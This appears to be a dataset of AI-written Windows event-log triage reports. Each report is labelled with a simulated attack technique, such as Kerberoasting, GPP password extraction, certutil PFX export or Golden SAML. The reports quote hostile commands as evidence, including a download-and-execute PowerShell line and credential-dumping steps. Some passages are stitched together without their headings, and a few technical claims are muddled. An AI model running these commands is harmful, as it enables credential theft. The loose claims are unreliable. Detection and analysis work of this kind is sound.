1. **Verification**: Verify user `admin_test` operations and intentions with the system administrators to confirm whether these activities were scheduled and legitimate.
2. **Audit and Monitoring**: Ensure comprehensive audit logging is enabled, particularly for security events, to capture a complete picture of user activities.
3. **Threat Hunt**: Conduct a thorough threat hunting session in the network for indicators of compromise and unauthorized access, especially focused on Active Directory activity.
4. **Increase Visibility**: Implement monitoring solutions with alerts on the execution of sensitive commands and unauthorized attempts to access or modify domain controller environments.
"
Simulating access to Opera Login Data,"Upon careful analysis of the provided Windows event logs, several points of interest and concern have emerged. The summary below consolidates the findings and categorizes the activity within the logs:

### Analysis and Observations:

1. **PowerShell Activity:**
   - **Command Execution:**
     - The `Copy-Item` PowerShell command executed is suspicious. It attempts to copy the ""Login Data"" file from the Opera browser's profile directory into a temporary folder under an obfuscated path.
     - This can be an indicator of credential harvesting or data exfiltration, as ""Login Data"" could contain passwords or session tokens.
   - **Timing:**
     - The sequence of PowerShell events indicates a rapid succession of events, typically parallel with script execution.
     
2. **Sysmon Activity:**
   - **Frequent Use of System utilities:**
     - Processes like `wevtutil.exe`, `conhost.exe`, and `hostname.exe` are observed being executed in close intervals.
     - `wevtutil.exe` is often used by attackers to clear event logs to cover tracks. The frequency and context of its execution here raise red flags.
   - **PowerShell and COMMAND Executions:**
     - Multiple instances of PowerShell and system command executions within a short time frame further stress potential automation, typically a characteristic of script-based attacks.

3. **User and Process Context:**
   - All observed activities are attributed to the user `SERVER002\\admin_test`, hinting either the legitimate use of this account or the potential compromise of administrative privileges.
   - Activities are performed with high integrity levels, providing the processes substantial rights on the system.

4. **Missing Logs:**
   - Observing no data in Security and System logs might portend log tampering or very conveniently omitted sections in the provided data. This could correlate with potential log-clearing attempts.

### Conclusion:

**Resolution: MALICIOUS**

Based on the examination of the event logs, there are strong indicators of potential malicious activity due to:
- Attempted data exfiltration using PowerShell.
- Instances of system utilities being used in a manner consistent with log clearing.
- Continuous administrative-level actions which were executed in a streamlined manner indicative of automated attack scripts.

### Recommendations:

- **Immediate Action:** Isolate Server002 to prevent any further data exfiltration and halt unauthorized command execution.
- **Log Monitoring and Analysis:** Continue deeper historical log analysis to uncover any prior execution or similar patterns.
- **Credential Audit:** Reset credentials for `admin_test` and other administrative accounts to mitigate further unauthorized access.
- **Malware Inspection:** Conduct a comprehensive malware scan on the host and review any external file transfers from isolated environments.
- **Enhanced Security Protocols:** Implement multi-factor authentication and a robust logging/alerting mechanism to catch unauthorized accesses in future occurrences. 

It is critical to take these suggested steps to secure the environment and prevent future compromises stemming from similar security lapses."
Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list),"Upon reviewing the provided event logs, let's summarize the key events and steps to determine if there are any indicators of malicious activity:

### Security Log:

- **EventID 5379**: Multiple credential read events failed with `ReturnCode: 3221226021` across different TargetNames (e.g., MicrosoftAccount, WindowsLive). This code often indicates access denied, which is typical if an unauthorized process or user attempts to read credentials. 

### Windows PowerShell Log:

- **Events showing PowerShell activity**: The execution of PowerShell commands involving `appcmd.exe list apppool` is observed. While `appcmd.exe` is a legitimate tool for managing IIS web server configurations, its execution context is important, especially if run by an unrecognized user or alongside suspicious scripts.

### Sysmon Log:

- **Process Creation Events**: Numerous processes initiated by `SERVER002\admin_test`, including executions of `powershell.exe`, `wevtutil.exe`, and commands like `whoami` and `hostname` were observed. While these are legitimate utilities, the context of their use could determine potential misuse.
  
- **Process Integrity**: Notably, processes like PowerShell and executable commands are run at high integrity levels, which could indicate an attempt at process elevation or sensitive operations.

### Analysis:

1. **Credential Access Failures**: Multiple repeated failures to access or read credentials could indicate an illegitimate attempt to access sensitive information. This activity is suspicious given its repeated failure and returns with specific error codes denying access.

2. **PowerShell Activity**:
   - PowerShell invoked to list application pools (`appcmd.exe list apppool`) can be legitimate for an admin user managing IIS but could also be abused for reconnaissance by attackers (e.g., fingerprinting IIS configurations).
   - If `admin_test` is a legitimate administrator user and these commands align with expected tasks, this activity might be benign. However, unauthorized use could imply reconnaissance or preparation for privilege escalation or lateral movement attempts.

3. **Repeated Access to System Utilities**:
   - Tools like `wevtutil.exe`, `whoami`, and `hostname` are frequently employed in post-compromise actions for system reconnaissance and log manipulation. Their use should be verified against expected system admin actions.

### Assessment and Resolution:

Given the context of these logs, determined relevance to typical administrative tasks, or lack thereof, can change the assessment. However, considering potential unauthorized access attempts to credentials and usage patterns of utilities that are often leveraged for nefarious activities, it would be prudent to exercise caution.

- **Resolution**: **SUSPICIOUS**
  - **Recommendation**: Further investigation is warranted. Immediate actions should include verifying logs against legitimate administrative activities, auditing `admin_test` account usage, reviewing PowerShell command history, and potentially employing real-time monitoring to detect any further aberrant behavior. Consider blocking or closely monitoring any unusual outbound connections or data transfers."
GPP Passwords (Get-GPPPassword),"**Detailed Analysis:**

Upon reviewing the provided Windows event logs across various channels (Sysmon, Windows PowerShell, Security, Application, and System logs), several aspects stand out which require attention:

1. **Sysmon Log:**
   - A significant number of events indicate the execution of legitimate Windows system processes such as `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `conhost.exe`. These processes alone do not necessarily indicate malicious behavior.
   - However, a particular event involves the PowerShell execution with the script `Get-GPPPassword.ps1`:
     - **PowerShell Event (ProcessId: 4948)**: The command line indicates the execution of `Get-GPPPassword.ps1`. This script is known for extracting plaintext Group Policy Preferences (GPP) passwords, which can be a security risk if used maliciously. This is an important red flag.

2. **Windows PowerShell Log:**
   - The PowerShell logs corroborate the execution of the `Get-GPPPassword.ps1` script. The script was run in a context often associated with attempts to gather sensitive information.

3. **Security Log:**
   - The logs indicate expected system activities like logons and service operations, primarily executed under `NT AUTHORITY\SYSTEM`, which is common and typically benign.
   - Privileged tokens and elevated token events (4672) appear normal for SYSTEM processes but should still be checked for anomalies if suspicious activity is detected elsewhere.

4. **Application Log:**
   - Listed events do not indicate any anomalies directly related to potential malicious or abnormal activity. Mostly expected operational logs are seen.

5. **System Log:**
   - The logs provided are empty in this section, offering no additional data.

**Assessment:**

The execution of `Get-GPPPassword.ps1` is the most significant indicator of potentially unauthorized or suspicious activity. This script is notorious for being used in malicious contexts to retrieve sensitive information from Active Directory environments. The presence of this script suggests that an individual may have been attempting to compromise the security of the domain or gather unauthorized information.

**Resolution: SUSPICIOUS**

This activity is marked as **SUSPICIOUS** due to:
- The execution of `Get-GPPPassword.ps1`, which is indicative of a security threat or an administrative task that requires clarification and justification.
  
**Guidance on How to Proceed:**
- Conduct a full investigation into the context and intent behind the execution of the `Get-GPPPassword.ps1`.
- Identify the user `admin_test` and confirm their activities and intended authorization for running this script.
- Check for any unauthorized changes or access to critical accounts or data.
- Review endpoint security controls to ensure they are properly configured and reporting similar activities.
- Consider conducting a broader forensic analysis to check for other signs of compromise across the network.

This resolution suggests there is enough evidence of potentially harmful activity to warrant a thorough investigation to avoid data breaches or escalated security risks."
Export Root Certificate with Export-PFXCertificate,"Upon reviewing the provided logs, several observations were made that lead to a determination of the activities on the Windows host. Below, each section of the logs is evaluated for potential indicators of compromise.

### System Log:
- Several events appear to be related to standard Windows operations, such as time adjustments and service logs. The activities involving `svchost.exe` do not inherently signify malicious behavior as svchost is a common Windows host process for services.

### Windows PowerShell Log:
- A PowerShell command is executed that creates a self-signed certificate and exports it as a PFX file. 
- The command involves `ConvertTo-SecureString`, `New-SelfSignedCertificate`, and `Export-PfxCertificate`, which are typical components of administrative tasks but should still be scrutinized if executed in an unexpected context or without authorization.

### Security Log:
- The presence of multiple events concerning key operations with the Microsoft Software Key Storage Provider indicates cryptographic key usage which aligns with actions noted in the PowerShell log. The operations appear legitimate, associating with user `admin_test`.

### Sysmon Log:
- The Sysmon logs highlight the execution of several commands and processes like `wevtutil.exe`, `conhost.exe`, and `whoami.exe`. These commands and processes are standard and, in isolation, do not imply malicious activity.
- The logged PowerShell execution matches the suspicious behavior identified in the PowerShell log. However, no evidence confirms compromise; it might just be administrative activity without further context or confirmation.

### Application Log:
- Events related to `edgeupdate` are logged, which is a normal process for updating Microsoft Edge and does not indicate malicious activity.

### Final Assessment:
- **Suspicious Behavior**: The PowerShell activity stands out as suspicious. The generation and export of a self-signed certificate may be part of a legitimate task; however, it should be validated against authorized activities, especially since it might be related to initial stages of malicious behavior such as unauthorized encryption or lateral movement setup.
- Given these analyses, additional context around this activity is required—such as the context of the user session, recent changes, and expected tasks—before confirming malicious intent.

**Resolution**: **SUSPICIOUS**

### Guidance:
- Conduct a review of user `admin_test` activities and permissions to determine if the PowerShell execution aligns with their role and recent tasks.
- Verify with the IT department or involved personnel if the PowerShell certificate operations were authorized and document the justification.
- Review environment baselines to establish whether such PowerShell activities are common in this host.
- Implement monitoring for similar PowerShell commands and other cryptographic operations to detect potentially unauthorized attempts in the future.
"
Dump Kerberos Tickets from LSA using dumper.ps1,"Based on the Windows event logs shared, here's the detailed analysis:

1. **Time Manipulation (EventID: 4616, 1):**
   - The logs indicate the system time was changed, specifically seeing time being set back. This can be benign (e.g., due to incorrect settings or time sync adjustments) but can also be a tactic used by malware to evade detection by rolling back timestamps on various logs or events.

2. **Privileged Access (EventID: 4672):**
   - The `admin_test` user was granted a substantial list of privileges (`SeSecurityPrivilege`, `SeBackupPrivilege`, etc.). While privilege elevation is occasionally legitimate, it's crucial to verify if this admin access is expected and consistent with the user's normal behavior or could indicate a security breach.

3. **Login Activity (EventID: 4624, 4634):**
   - The `admin_test` account logged on with type 3 (network), which could suggest remote access. This account activity should be validated against expected user behavior to ascertain if it's consistent or anomalous.

4. **PowerShell Commands (PowerShell EventID: 600):**
   - PowerShell was used to execute a script via `Invoke-Expression` that downloads from an external URL (`dumper.ps1`). The use of PowerShell for downloading and executing scripts is highly suspicious and a common vector for malicious activities.

5. **Sysmon Logs (Sysmon EventID: 1, 5):**
   - There are multiple entries where processes like `wevtutil.exe`, `whoami.exe`, and `conhost.exe` were executed by `admin_test`. The execution of `wevtutil.exe` can be suspicious in post-exploitation scenarios, where an attacker might clear event logs to erase traces. The execution of `whoami.exe` is a common step used by attackers to verify user context.

6. **External Tool Downloads:**
   - The use of PowerShell to download scripts suggests a potentially malicious action likely aiming to escalate privileges or exfiltrate data.

Assessment:
- The series of events, notably involving time manipulation, privilege elevation, suspicious PowerShell usage, and potential evasion tactics, strongly suggest signs of compromise.

Resolution:
- **MALICIOUS.** Given the combination of time tampering, privilege abuse, and suspicious script execution originating from external URLs, these actions are highly indicative of a potential compromise.

Guidance on how to proceed:
- Immediately isolate the affected machine from the network to prevent further compromise or lateral movement.
- Conduct a thorough forensic analysis to verify the scope of the compromise. Look for any additional payloads or persistence mechanisms installed.
- Review and validate all user accounts and recent changes, especially focusing on access rights and privileges to ascertain misuse.
- Patch the system, run a comprehensive antivirus/malware scan, and consider a complete system rebuild if the compromise is significant.
- Evaluate your network's security posture, including reviewing firewall rules and improving monitoring to detect such actions in the future."
Password spray all Azure AD users with a single password,"### Analysis of Windows Event Logs

#### Summary of Findings

Upon review of the provided Windows event logs from Server002, I identified several activities that indicate potential malicious behavior, specifically highlighting a suspicious PowerShell script execution that appears to perform password spraying attacks against Azure Active Directory (Azure AD) accounts.

#### Detailed Analysis

1. **PowerShell Activity**:
   - Multiple `Sysmon` and `Windows PowerShell` logs reveal the execution of a PowerShell script run by the user `SERVER002\admin_test`.
   - The PowerShell command involves importing the `AzureAD` module and running a script that tries to authenticate Azure AD accounts using common passwords (`iamthebatman` and `P@ssw0rd!`).
   - This script attempts to connect to Azure AD using potentially compromised credentials, which is characteristic of a password spray attack. Commands like `Connect-AzureAD`, `Get-AzureADUser`, and respective attempts to validate user credentials strongly indicate attempts to brute-force user accounts.

2. **Correlation with Other System Events**:
   - Simultaneous executions of multiple instances of `wevtutil.exe` and `conhost.exe` could suggest attempts to manipulate event logs or interact with console operations. However, without further context (e.g., network behavior logs or user activity logs), they serve as supporting indicators rather than conclusive evidence themselves.

3. **Security Logs**:
   - The security log indicates the setup executable associated with Edge browser updates (`EDGEMITMP_8E28E.tmp\setup.exe`) was executed by the system account. While Edge updates may be routine, they coincide with the time frame of the PowerShell activities, and further validation is warranted to ensure they are legitimate updates.

4. **Potential Threat Vector**:
   - The activity was executed under a high integrity level, indicating either administrative permissions were leveraged or the system was potentially compromised at a privileged level.

#### Assessment

Given the nature of the PowerShell activities, which explicitly attempt credential stuffing against Azure AD, this is clearly an instance of **MALICIOUS** behavior.

#### Recommended Actions

1. **Immediate Containment**:
   - Isolate the host from the network to prevent further credential compromise or unauthorized access.
   - Revoke any active sessions for credentials potentially exposed by the password spraying.

2. **Eradication and Recovery**:
   - Conduct a comprehensive security audit of Azure AD to identify any unauthorized access or compromised accounts.
   - Reset passwords for potentially compromised accounts and enforce strong, unique password policies.
   - Verify the integrity of any recent Edge browser updates with a trusted package source.

3. **Incident Response and Forensics**:
   - Conduct a thorough investigation of logs and network packets around the timeline of the incident for any lateral movement or persistence mechanisms.
   - Review all user activities, especially `admin_test`, for any sign of unauthorized access or privilege escalation.

4. **Preventive Measures**:
   - Enable multi-factor authentication (MFA) across all user accounts to strengthen security against similar attacks in the future.
   - Implement strict PowerShell logging policies to detect and alert on potentially malicious scripts.
   - Regularly update security training and simulations for the IT staff to recognize and respond to such threats.

In conclusion, the detected PowerShell activities in the logs unambiguously indicate a possible credential attack, warranting the classification of **MALICIOUS** behavior and necessitating immediate action to mitigate risks and explore the extent of any possible breach."
Access Saved Credentials via VaultCmd,"### Detailed Analysis:

#### Security Logs:
1. **EventID 4616 (System Time Change)**:
   - **Occurrences**: Two consecutive entries for `System Time Change`.
   - **Observation**: The first event indicates a significant time change from `22:27:51.29` to `22:27:45.84`, which is not typical and could indicate attempts to manipulate time for obfuscation or log tampering.
   - **Process**: `C:\\Windows\\System32\\svchost.exe` (a standard Windows process but often exploited).

2. **EventID 4624 (Logon Success) and 4634 (Logoff)**:
   - **User**: `admin_test` with Logon Type 3 (network logon).
   - **Observation**: Legitimate use if the user is a known user, but combined with other suspicious activities could heighten risk perception.

3. **EventID 4672 (Special Privilege Assigned)**:
   - **Privileges**: User `admin_test` was granted several high-level privileges, including `SeDebugPrivilege`, which is often used by attackers for lateral movement or privilege escalation.

#### Sysmon Logs:
1. **Process Creation Events**: 
   - Series of processes created by `admin_test` (e.g., `whoami.exe`, `HOSTNAME.EXE`, `cmd.exe` with `vaultcmd /listcreds`).
   - **Observation**: Use of `vaultcmd` suggests attempts to access credential storage, considered suspicious in any administrative activity.
   - **Parent-Child Relationships**: Processes seem to be executed in a chain with known executable paths, but the context indicates potential misuse or exploration of system internals.

2. **Persistence and Reconnaissance**:
   - Multiple instances of `wevtutil.exe`, indicating possible attempts to export, clear, or otherwise manipulate event logs.

#### System Logs:
1. **Kernel-General Events (Time Discrepancies)**:
   - As noted in Security logs, time was adjusted twice. This adjustment could be due to time synchronization issues, but given other suspicious activities, it could suggest log tampering attempts.

#### Overall Suspicious Indicators:
- **Time Manipulation**: Unusual time set backward aligns with potential malicious actions to evade detection or confuse incident logging.
- **High Privileges**: `admin_test` having extensive privileges combined with other activities raises suspicion for unauthorized internal reconnaissance or preparatory actions for further compromise.
- **Credential Access and Log Manipulation**: Use of `vaultcmd` and `wevtutil.exe` portrays an attempt to access sensitive data and potentially hide tracks.

### Assessment:
Based on the analyzed logs, there is clear evidence of suspicious activities given the critical events occurring in a short timeframe, manipulation of the system time, access to potentially sensitive information using credential commands, and unusual privilege assignments.

### Resolution:
- **SUSPICIOUS** - The logs contain activity that doesn't look right and necessitates more investigation to ascertain whether there is indeed malicious intent or unauthorized access/comprehensive configuration review including validation of user `admin_test` activities and credentials. Investigate potential insider threats or compromised accounts.

### Next Steps:
- **Validate User Activity**: Verify `admin_test`'s recent activities, especially around the timeframe these events occurred.
- **Review System Time Settings and Sources**: Ensure time settings are correct and that NTP is synchronized correctly.
- **Monitor for Pattern Continuation**: Put additional monitoring on `Server002` to track for repeated or escalated suspicious behavior.
- **Security Measures**: Consider removing unnecessary privileges and enhancing logging around sensitive processes and privilege escalations. Conduct thorough endpoint security assessments to detect potential residual activity from unauthorized access attempts."
CertUtil ExportPFX,"Upon reviewing the logs provided, several activities stand out, particularly involving PowerShell and process executions. Below is a detailed analysis of these activities:

1. **PowerShell Activity with Remote Script Execution:**
   - There are multiple instances where PowerShell is used to invoke a script via the `IEX(IWR...)` method. Specifically, the script `RemoteCertTrust.ps1` is being downloaded from a non-official source (`https://github.com/file/file-file/raw/master/files/data.004/src/RemoteCertTrust.ps1`) and executed. This is associated with another tool `certutil.exe` used for exporting a certificate to a .pfx file with a password. 
   - This method of downloading and executing scripts directly from the internet is a known technique used by attackers for running malicious scripts without directly hosting them on the local system. This poses a significant security risk because it uses PowerShell’s capabilities to bypass security controls.

2. **Suspicious Process Activity:**
   - Multiple instances of `certutil.exe` are involved in exporting certificates. While `certutil` is a legitimate tool, it is often misused by attackers for malicious purposes, such as evading detection, downloading files, or manipulating certificates.
   - Command executed: `certutil.exe -p password -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 c:\\temp\\file.pfx`.

3. **Use of High-Integrity Processes:**
   - The `SERVER002\admin_test` account, which appears to have high privileges, is executing these suspicious commands. The integrity level is marked as ""High,"" indicating administrator-level access being leveraged to run these scripts and commands.

4. **System Time Manipulation:**
   - Several events indicate changes in system time, which could suggest attempts to manipulate logs or timestamps. These activities, coupled with the suspicious command activities, raise significant red flags.

5. **Use of Common Administrative Tools:**
   - Legitimate Windows tools like `wevtutil.exe`, `whoami.exe`, and `hostname.exe` are used. While these tools themselves are not inherently malicious, they might be part of a script or a process chain crafted to perform reconnaissance or other unauthorized activities under the guise of normal operation.

**Threat Assessment:**
- The combination of PowerShell script execution from a URL, the use of `certutil.exe` to handle certificates, and the manipulation of timestamps leads to a high probability of malicious intent. The activity is indicative of a possible breach or compromise, likely to establish a foothold, export sensitive information, or further compromise the system integrity.

**Resolution: MALICIOUS**
- The logs provide clear indicators of potentially malicious activity, warranting immediate investigation and response. 

**Guidance on How to Proceed:**
1. **Immediate Containment:**
   - Isolate the affected system (Server002) from the network to prevent any further propagation of potential threats.

2. **Thorough Investigation:**
   - Conduct a forensic analysis of the system to identify and remove the malicious scripts and tools, such as checking for persistence mechanisms and retrieving any malicious artifacts.

3. **Credential Management:**
   - Review and reset credentials for compromised accounts such as `admin_test`.

4. **Enhanced Monitoring and Alerts:**
   - Implement additional monitoring, particularly around PowerShell and similar scripting activities, to detect and block similar future activities.

Create Volume Shadow Copy with WMI,"## Analysis:

Upon reviewing the provided Windows event logs, here's a detailed breakdown of the observations:

### Sysmon Log Analysis:

1. **Command Execution**:
   - **cmd.exe** and **reg.exe**: Commands to query registry keys are observed multiple times:
     - Command Line: `cmd.exe /c reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions /v ProductType | findstr LanmanNT`
     - Observed throughout the logs. This can indicate someone is checking if the machine is a domain controller. In itself, this is not indicative of malicious behavior but should be noted for context.

   - **wmic shadowcopy call create**:
     - This command relates to creating a volume shadow copy. If performed without a legitimate purpose, it is highly suspicious as it can be used for data backup purposes, often related to ransomware activities.

2. **Integration with Services**:
   - **wsmprovhost.exe**: The parent process responsible for starting several processes, such as cmd.exe and others noted above. It is a legitimate Windows process used for Windows Remote Management.

3. **Multiple **operations involving `wevtutil.exe` are present**:
   - Used to export, archive, or clear event logs. The presence of this could indicate attempts to clear logs, which malicious actors might perform to cover their tracks.

4. **Management Utility Execution**:
   - **hostname.exe** and **whoami.exe** are being used:
     - Gathering user and system information. Common in script operations or audit checks.

5. **Use of High Integrity Level**: 
   - Most operations executed under high integrity level, which is typical for certain administrative tasks but could be concerning if done without proper administrative context.

### Security Log Analysis:

1. **Privilege Use**:
   - Event 4672 logged for SYSTEM: indicates special privileges were assigned to SYSTEM, which is expected but important for tracing what actions required elevated privileges.

2. **Logon and Logoff Events**:
   - Logs indicate sessions and elevated tokens, typical in regular operation, yet important for correlating other activities.

3. **Credential Read Operations**:
   - Event ID 5379 indicates attempts to access credentials related to Microsoft Accounts. Return code `3221226021` denotes unsuccessful actions, likely normal in most systems where these accesses aren't routine.

### Kernel and System Log Analysis:

1. **Time Adjustments**:
   - Events indicate changes in system time. This may occur for various reasons but can be exploited by malicious actors to misalign timestamps.

2. **System Updates**:
   - Windows Defender updates, which are benign and reflect system maintenance being performed.

## Conclusion:

Based on the analysis:

- **SUSPICIOUS**: While much of the observed activity in isolation does not immediately denote a breach, certain actions like the use of `wmic shadowcopy`, repeated registry queries involving domain-checking commands, and occurrences of `wevtutil.exe` which could indicate tampering with logs call for further examination.
- The activities, particularly surrounding system maintenance utilities (like shadow copies & command-line querying), may be routine, but could also be pre-emptive steps in a larger malicious strategy, such as setting the scene for ransomware deployment or persistence mechanisms.

### Recommended Actions:

1. **Further Investigation**:
   - Examine who executed the shadow copy command and the context (e.g., check if a known admin ran this intentionally).
   - Validate the purpose and necessity of running `wevtutil.exe` in your current systems practices.
   - Look into system integrity checks to ensure no tampering of system files or configurations.

2. **Continuous Monitoring**:
   - Ensure continued monitoring of these processes and similar activity, focusing on unexpected spikes or patterns aberrations.

   - **Notable PowerShell Usage:** 
     - There is a specific PowerShell command of concern in the logs with the command line argument copying browser-related files (`key4.db` and `logins.json`) and using `BrowserCollector.exe`. These files (`key4.db` and `logins.json`) are associated with storing encrypted saved passwords and login data for Mozilla Firefox, respectively. The activity involves copying these sensitive files to an external location and subsequently replacing them with files from another directory.
   - **Potential Data Exfiltration:** 
     - The PowerShell command seems to involve data manipulation and possible exfiltration using `BrowserCollector.exe`. Removing sensitive files and possibly replacing them with alternate files indicates potential tampering and exfiltration.

2. **Application Log Analysis:**
   - **Windows Defender Status:**
     - Windows Defender is active and in a healthy state according to the logs, indicating that the built-in antivirus was at least running during this time frame.

3. **Windows PowerShell Log Analysis:**
   - **Execution of Complex Script:**
     - The Windows PowerShell logs confirm the execution of a script that correlates with the suspicious activity noted in the Sysmon logs. The PowerShell sessions involved complex commands related to browser file manipulation within temporary directories, potentially for nefarious purposes.

### Conclusion:
The activities recorded in the logs, especially related to PowerShell, are indicative of potential malicious actions. The copying and altering of sensitive browser files could be an attempt to harvest credentials or exfiltrate data, which is a recognized tactic by attackers exploiting scripting capabilities on Windows systems.

### Resolution:
- **MALICIOUS:** The presence of PowerShell commands that manipulate sensitive data files such as those containing stored passwords suggests malicious activity, particularly given the patterns observed and the presence of potentially unauthorized tool usage like `BrowserCollector.exe`.

### Guidance on How to Proceed:
1. **Immediate Containment:** Isolate the affected system from the network to prevent further potential data exfiltration.
2. **Forensic Analysis:** Collect and preserve logs, memory dumps, and any anomalous files for deeper forensic analysis.
3. **Credential Change:** Advise the user to change all passwords associated with the accounts that may have been compromised.
4. **Threat Hunting:** Conduct a broader threat hunt across the network to check for similar indications of compromise or wider spread intrusions.
5. **Update Security Measures:** Ensure all systems and applications are updated with the latest security patches, and consider implementing additional security controls or monitoring solutions.

This incident requires further investigation by the security team to fully understand the scope and impact."
Offline Credential Theft With Mimikatz,"Upon reviewing the provided event logs, here is a detailed analysis of the activity observed:

1. **Windows Update Log (System log)**:  
   - The Windows Update Client log entry records a routine update for Microsoft Defender Antivirus. This is a benign activity indicating that the system is kept up-to-date with the latest security definitions, which is good for system health and security.

2. **Sysmon Log**:
   - **Command Execution**: The Sysmon logs include the execution of `cmd.exe` with a particular command line: `C:\Windows\system32\cmd.exe /c ""if not exist %tmp%\lsass.DMP (exit /b 1)""`. This command is typically used to conditionally check for the existence of a `lsass.DMP` file. While the command itself doesn't direct to malicious activity, it may suggest preparatory actions potentially related to credential dumping if seen in malicious contexts.
   
   - **Process Tree Analysis**: PowerShell is calling `cmd.exe`, and then further command executions of `wevtutil.exe` (used to manage Windows event logs) and `hostname.exe`, `whoami.exe` commands. The presence of `wevtutil.exe` can often suggest attempts to clear or export event logs, which could be indicative of evasion techniques employed by malicious actors to cover their tracks.

   - The use of `whoami.exe` and `hostname.exe` indicates attempts to gather system information and user account details. These commands are often benign and are used to confirm credentials and system identity.

3. **Behavior Analysis**:
   - The `cmd.exe` command's context cues combined with `PowerShell` as the parent process is potentially suspicious but not definitively malicious without additional context or observed malicious payloads or actions following this behavior.
   - Execution of `wevtutil.exe` multiple times could attempt to suppress or modify Windows event logs, a known tactic used in attack scenarios to hinder detection.
   - The regular presence of system utilities being executed in succession could indicate either a scripted automated task or potential malicious activity depending on the origin and intent.

### Assessment:
- **SUSPICIOUS**: The activity documented suggests potential indicators of reconnaissance and possible preparation for credential access via `lsass.DMP`. The repeated usage of `wevtutil.exe` also raises questions about log file interactions typically associated with evasion techniques. However, without further contextual data (e.g., network traffic, user verification of actions), this cannot be classified definitively as malicious.

### Recommendations:
1. **Deepen Investigation**: 
   - Verify user activity around the times these commands were executed to confirm legitimacy.
   - Assess changes in the Windows event logs during and shortly after the observed period for signs of modification or deletion.
   
2. **Network Monitoring**:
   - Implement and review network traffic logs to detect if any unusual data has been exfiltrated or sent to potentially malicious destinations.

3. **Endpoint Investigation**:
   - Conduct an in-depth scan on the host with updated security solutions.
   - Review scheduled tasks, scripts, and automated processes that might align with these logged activities.

Proceed by observing enhanced monitoring on the host and adjacent systems to preempt and thwart potential malicious exploitation."
Request for service tickets,"Upon analyzing the provided Windows event logs, here is a detailed assessment of the situation:

### Security Logs:
The Security logs (Event ID 4616) illustrate the system time being changed by the `LOCAL SERVICE` account. This in itself could be routine; however, discrepancies in system time can sometimes be indicative of malicious activity, like attempts to cover tracks. However, there are no indicators here that clearly suggest malicious intent from these logs alone.

### Sysmon Logs:
1. **PowerShell Execution:**
   - The logs show execution of `powershell.exe` with a command line that downloads and executes a script from `https://raw.githubusercontent.com/EmpireProject/Empire/.../Invoke-Kerberoast.ps1`. This script is known to be part of the Empire Project used for post-exploitation activities, including credential dumping (Kerberoasting). This is a significant indicator of malicious activity.
   
2. **Processes and Parent Processes:**
   - The execution of `whoami.exe`, `wevtutil.exe`, and multiple instances of `conhost.exe` in quick succession could suggest script or automated activity consistent with enumeration or process manipulation, often seen in malicious actions.

### Windows PowerShell Logs:
The PowerShell logs corroborate the Sysmon logs, indicating that a script to perform `Invoke-Kerberoast` was indeed executed. This is aligned with known attack patterns where attackers attempt to extract service account credentials from the Kerberos ticket cache, and it's an explicit indicator of malicious activity.

### Application and System Logs:
- The application logs reflect normal Windows Defender status messages and do not record any attempts to disable or modify security settings, which is benign.
- System logs indicate time changes, possibly linked to routine network time protocols (NTP), and thus are benign given the supporting information.

### Conclusion:
Given the execution of the PowerShell command that is directly tied to post-exploitation frameworks such as Empire, there is a strong indication of malicious activity on the host. The execution of known malicious scripts points to a compromise scenario.

### Resolution:
- **MALICIOUS.** The activity logged, particularly concerning the PowerShell execution of potentially malicious scripts, is conclusive of malicious intent.

### Guidance:
1. **Immediate Actions:**
   - Isolate the affected machine (Server002) from the network to prevent any lateral movement or data exfiltration.
   - Begin incident response procedures focusing on further analysis of the system for additional signs of compromise or persistence mechanisms.
   
2. **Mitigation and Recovery:**
   - Analyze network traffic for communication with known malicious domains.
   - Review Active Directory logs for any unauthorized access or privilege escalations.
   - Change credentials and reset any accounts that may have interacted with the affected host.
   
3. **Prevention:**
   - Implement enhanced monitoring for PowerShell and other scripting activities, using tools that can alert and block known malicious commands.
   - Educate users on the risks of executing untrusted scripts and the importance of endpoint security hygiene.

Golden SAML,"### Detailed Analysis of Windows Event Logs

#### PowerShell Logs
1. **Event Summary:**
   - Series of events where PowerShell was executed on `Server002`.
   - The script involves the import of AADInternals module and using the New-AADIntSAMLToken cmdlet to generate a SAML token, likely for accessing ADFS (Active Directory Federation Services).
   - The attempt to acquire an access token for Azure AD Graph API and cache the connection.
   - Frequent mentions of ""Golden SAML"" technique, which hints at serious implications.

2. **Suspicious Observations:**
   - **Golden SAML:** The use of scripts related to Golden SAML is a red flag as it typically indicates an attempt to create fraudulent SAML tokens, allowing adversaries to access federated services.
   - **AADInternals Module:** This is a known security testing and exploitation framework, sometimes used for penetration testing, but can also be used for malicious intent.
   - **ImmutableID and PFX File:** Attempt to manipulate identification and possible use of a PFX file for signing SAML tokens indicates a high level of access, necessary to create trust relationships fraudulently.

3. **Indicators of Potential Compromise:**
   - The script attempts to persistently acquire an AAD Graph access token, suggesting potential lateral movement or privilege escalation desires.

#### Sysmon Logs
1. **Event Summary:**
   - Execution of multiple system processes with elevated privileges, including PowerShell, conhost.exe, and utilities like wevtutil.exe and hostname.exe.
   - Notable process executions initiated by the user ""SERVER002\admin_test"".
   - Many subordinate console host and utility executions that appear nested under PowerShell execution.

2. **Suspicious Observations:**
   - **Wevtutil.exe:** Frequent invocation of the Windows Event Utility (wevtutil.exe) by an administrator could indicate log tampering or event log deletion attempts.
   - **Windows PowerShell:** Multiple instances of PowerShell triggered with elevated privileges corroborate potential malicious scripts execution.
   - **Conhost.exe:** Legitimate in context but often misused to obfuscate malicious console command history.

3. **Indicators of Potential Compromise:**
   - Frequent use of administrative utilities in quick succession could indicate attempts to cover tracks or interfere with logging and monitoring.

### Assessment
The event logs exhibit the involvement of a PowerShell script leveraging AADInternals with an indication of attempting a Golden SAML attack. The concentration on token generation and access token retrievals, along with system executables handled by an admin, reflect behaviors typically associated with advanced persistent threat (APT) actors. This, coupled with system process invocation patterns, strongly suggests unauthorized attempts to access or tamper with federated trust tokens.

### Conclusion
**Resolution: MALICIOUS**

### Guidance on How to Proceed
- **Immediate containment** is required: Disable the affected user’s (admin_test) account and invalidate any tokens generated during the suspicious period.
- **Conduct a full digital forensic investigation** to understand the breadth of the breach.
- Verify the integrity of the ADFS setup, its configuration, and scrutinize server certificates and trust relationships.
- **Enhance monitoring**: Implement strict PowerShell activity logging and ADFS log analysis.
- Implement controlled password reset for any accounts potentially impacted.
- Consider restricting or monitoring the use of exploitation frameworks like AADInternals within your network environment."
